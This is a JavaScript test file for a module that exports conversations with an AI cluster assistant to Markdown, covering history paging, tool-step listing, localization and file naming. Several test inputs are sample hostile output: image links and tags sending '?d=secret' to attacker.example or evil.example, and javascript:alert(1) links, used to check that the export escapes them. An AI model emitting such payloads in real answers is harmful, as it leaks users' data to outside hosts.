import {beforeEach, describe, expect, test, vi} from 'vitest';
import i18n from '../../i18n';
import {conversationMarkdown, ExportTooLong, exportFileName, turnsOf, wholeHistory} from '../conversationExport.js';

const prompt = (turn, text, at = '2026-11-26T09:00:00Z') => ({id: `${turn}:1`, turn_id: turn, role: 'user', text, created_at: at});
const answer = (turn, text, fields = {}) => ({
    id: `${turn}:2`,
    turn_id: turn,
    role: 'assistant',
    text,
    created_at: '2026-11-26T09:00:30Z',
    ...fields,
});

const markdown = (messages, fields = {}) =>
    conversationMarkdown({
        title: 'Why is web down',
        clusterName: 'Lab cluster',
        messages,
        exportedAt: new Date('2026-11-26T10:00:00Z'),
        timeZone: 'UTC',
        t: i18n.t,
        i18n,
        ...fields,
    });

describe('the export of a conversation', () => {
    beforeEach(async () => {
        await i18n.changeLanguage('en');
    });

    test('reads the whole history, the oldest page first', async () => {
        const client = {
            getMessages: vi
                .fn()
                .mockResolvedValueOnce({messages: [prompt('t3', 'third')], next_cursor: '3:1'})
                .mockResolvedValueOnce({messages: [prompt('t2', 'second')], next_cursor: '2:1'})
                .mockResolvedValueOnce({messages: [prompt('t1', 'first')], next_cursor: ''}),
        };
        const signal = new AbortController().signal;
        const messages = await wholeHistory(client, 'c1', {signal});
        expect(messages.map((message) => message.text)).toEqual(['first', 'second', 'third']);
        expect(client.getMessages.mock.calls.map(([id, options]) => [id, options.before, options.signal])).toEqual([
            ['c1', '', signal],
            ['c1', '3:1', signal],
            ['c1', '2:1', signal],
        ]);
    });

    test('gives up on a history too long, rather than read without end', async () => {
        const client = {getMessages: vi.fn().mockResolvedValue({messages: [prompt('t1', 'again')], next_cursor: '1:1'})};
        await expect(wholeHistory(client, 'c1')).rejects.toBeInstanceOf(ExportTooLong);
        expect(client.getMessages).toHaveBeenCalledTimes(64);
    });

    test('joins the assistant messages of a turn, the steps and the model of the last', () => {
        const turns = turnsOf([
            prompt('t1', 'Why?'),
            answer('t1', 'First part.', {id: 't1:2'}),
            answer('t1', 'Second part.', {id: 't1:4', model_id: 'haiku', history: {steps: [], stepsOmitted: 0, runs: []}}),
        ]);
        expect(turns).toHaveLength(1);
        expect(turns[0].answer).toMatchObject({text: 'First part.\n\nSecond part.', model_id: 'haiku'});
    });

    test('writes the title, the cluster, the prompts, the answers and their steps', () => {
        const text = markdown([
            prompt('t1', 'Why is prod/svc/web down?'),
            answer('t1', 'The **fs#1** resource failed.\n\n```sh\nom prod/svc/web logs\n```', {
                model_id: 'claude-haiku',
                history: {
                    steps: [
                        {id: 'c1', tool: 'get_object_status', arguments: {path: 'prod/svc/web'}, status: 'completed'},
                        {id: 'c2', tool: 'get_instance_logs', arguments: {path: 'prod/svc/web', node: 'n1'}, status: 'failed'},
                        {id: 'c3', tool: 'stop_instance', arguments: {path: 'prod/svc/web', node: 'n1'}, status: 'rejected'},
                    ],
                    stepsOmitted: 2,
                    runs: [{startedAt: 1000, endedAt: 13000}],
                },
            }),
        ]);
        expect(text).toBe(
            [
                '# Why is web down',
                '',
                'Cluster: Lab cluster · Exported on Nov 26, 2026, 10:00 AM · Times in UTC',
                '',
                '---',
                '',
                '### You · Nov 26, 2026, 9:00 AM',
                '',
                '```',
                'Why is prod/svc/web down?',
                '```',
                '',
                '### Assistant · Nov 26, 2026, 9:00 AM · 12 s',
                '',
                '> The \\*\\*fs#1\\*\\* resource failed.',
                '>',
                '> ```sh',
                '> om prod/svc/web logs',
                '> ```',
                '',
                '**Steps**',
                '',
                '- Read the status of prod/svc/web',
                '- Read the logs of prod/svc/web on n1 (refused by the tool)',
                '- Stop prod/svc/web on n1 (rejected by you)',
                '- 2 steps not kept in the history',
                '',
                '_Model: claude-haiku_',
                '',
                '---',
                '',
                '_The answers stopped or failed are not stored, nor exported._',
                '',
            ].join('\n')
        );
    });

    test('names the target a call ran on, with the changes of the user', () => {
        const text = markdown([
            prompt('t1', 'Stop web'),
            answer('t1', 'Stopped.', {
                history: {
                    steps: [
                        {
                            id: 'c1',
                            tool: 'stop_instance',
                            arguments: {path: 'prod/svc/web', node: 'n1'},
                            editedArgs: {path: 'prod/svc/web', node: 'n2'},
                            status: 'completed',
                        },
                    ],
                    stepsOmitted: 0,
                    runs: [],
                },
            }),
        ]);
        expect(text).toContain('- Stop prod/svc/web on n2 (with your changes)\n');
        expect(text).not.toContain('on n1');
    });

    test('writes a prompt as the transcript shows it, in a block none of its lines closes', () => {
        const text = markdown([prompt('t1', '\nWhy?\n[DEFAULT]\n\n\n# orchestrate = ha\n<id> *.log ```x``` ````\n  ')]);
        expect(text).toContain(
            ['`````', 'Why?', '[DEFAULT]', '', '', '# orchestrate = ha', '<id> *.log ```x``` ````', '`````'].join('\n')
        );
    });

    test('quotes an answer, its code blocks fenced again as written, one left open closed', () => {
        const text = markdown([
            prompt('t1', 'Show'),
            answer('t1', '```ini\n[a]\n\n\n[b]\n<img src=x> ![i](https://x)\n```\nThen:\n~~~\nopen ```` block\n### You · fake'),
            prompt('t2', 'Next'),
        ]);
        expect(text).toContain(
            ['> ```ini', '> [a]', '>', '>', '> [b]', '> <img src=x> ![i](https://x)', '> ```', '> Then:', '> `````', '> open ```` block', '> ### You · fake', '> `````', ''].join('\n')
        );
        // The next turn is the document's, out of the quote.
        expect(text).toContain('\n---\n\n### You · Nov 26, 2026, 9:00 AM\n\n```\nNext\n```\n');
    });

    // Out of its code blocks, an answer holds no markup but escaped: whatever the
    // model wrote, nothing loads, links or passes for html where the file is read.
    // An exclamation mark alone makes no image, its bracket escaped.
    const unescapedMarkup = (text) => {
        const prose = [];
        let fence = null;
        for (const line of text.split('\n').filter((item) => item.startsWith('>')).map((item) => item.replace(/^> ?/, ''))) {
            const marker = /^(`{3,})/.exec(line)?.[1];
            if (fence !== null) {
                if (line === fence) fence = null;
            } else if (marker !== undefined) {
                fence = marker;
            } else {
                prose.push(line);
            }
        }
        return prose.filter((line) => /[[\]<>`*_~|]/.test(line.replace(/\\[\s\S]/g, '')));
    };

    test.each([
        'See ![chart](https://attacker.example/?d=secret) and <img src=https://attacker.example> <!-- x -->.',
        '[Runbook](https://docs.example/run) [creds](https://u:p@attacker.example) [js](javascript:alert(1)) [rel](/etc)',
        '[note]: see ![p](https://evil.example/z.png?d=secret) and <img src="https://evil.example/y.png"> and <javascript:alert(1)>',
        '\\`![x](https://evil.example/leak?d=secret)`',
        'a ` b\nc ` ![x](https://evil.example/m.png) ` d',
        'text\n    ```\n![x](https://evil.example/a)\n\nmore <b>bold</b>',
        '- item\n  ```\n  code\n![x](https://evil.example/b)',
        '- [a]: javascript:alert(1)\n\n[a]:\njavascript:alert(1)\n\n[click][a]',
    ])('loads nothing and leads nowhere from an answer: %s', (written) => {
        const text = markdown([prompt('t1', 'Check'), answer('t1', written)]);
        expect(unescapedMarkup(text)).toEqual([]);
    });

    test('keeps the names of the steps and of the cluster from making links, emphasis or hidden text', () => {
        const text = markdown(
            [
                prompt('t1', 'Check'),
                answer('t1', 'Done.', {
                    history: {
                        steps: [
                            {id: 'c1', tool: 'get_object_status', arguments: {path: '[x](https://evil.example)*b*~~s~~\u202egpj'}, status: 'completed'},
                        ],
                        stepsOmitted: 0,
                        runs: [],
                    },
                }),
            ],
            {clusterName: '<img src=x> {{name}}\u200b', title: '# _title_\nnext'}
        );
        // A # past the one of the heading is its text.
        expect(text.split('\n')[0]).toBe('# # \\_title\\_ next');
        expect(text).toContain('Cluster: \\<img src=x\\> {{name}} · ');
        expect(text).toContain('- Read the status of \\[x\\](https://evil.example)\\*b\\*\\~\\~s\\~\\~gpj\n');
    });

    test('names an untitled conversation, and writes the dates in the language and the zone of the user', async () => {
        await i18n.changeLanguage('fr');
        const text = markdown([prompt('t1', 'Bonjour'), answer('t1', 'Bonjour.')], {title: '  ', timeZone: 'Europe/Paris'});
        expect(text.split('\n')[0]).toBe(`# ${i18n.t('ai.conversations.untitled')}`);
        expect(text).toContain('Exportée le 26 nov. 2026, 11:00 · Heures en Europe/Paris');
        expect(text).toContain('### Vous · 26 nov. 2026, 10:00');
    });

    test('names the file after the title, without accents, and the day', () => {
        const day = new Date(2026, 10, 26, 10, 0);
        expect(exportFileName('Pourquoi prod/svc/web est arrêté ?', day)).toBe('pourquoi-prod-svc-web-est-arrete-2026-11-26.md');
        expect(exportFileName('Cœur de cluster, Straße', day)).toBe('coeur-de-cluster-strasse-2026-11-26.md');
        expect(exportFileName('   ', day)).toBe('conversation-2026-11-26.md');
        expect(exportFileName('a'.repeat(59) + ' b', day)).toBe(`${'a'.repeat(59)}-2026-11-26.md`);
    });
    test('writes the procedure a prompt asked before its words, alone when sent without', () => {
        const text = markdown([
            {...prompt('t1', 'on n1'), skill: 'node-maintenance'},
            answer('t1', 'Done.'),
            {...prompt('t2', '/morning-check', '2026-11-26T09:05:00Z'), skill: 'morning-check'},
            answer('t2', 'Fine.'),
        ]);
        expect(text).toContain('/node-maintenance on n1');
        expect(text).toContain('/morning-check');
        expect(text).not.toContain('/morning-check /morning-check');
        // Words that start with blank lines follow the procedure on its line.
        expect(markdown([{...prompt('t1', '\n\non n2'), skill: 'node-maintenance'}])).toContain('/node-maintenance on n2');
    });
});
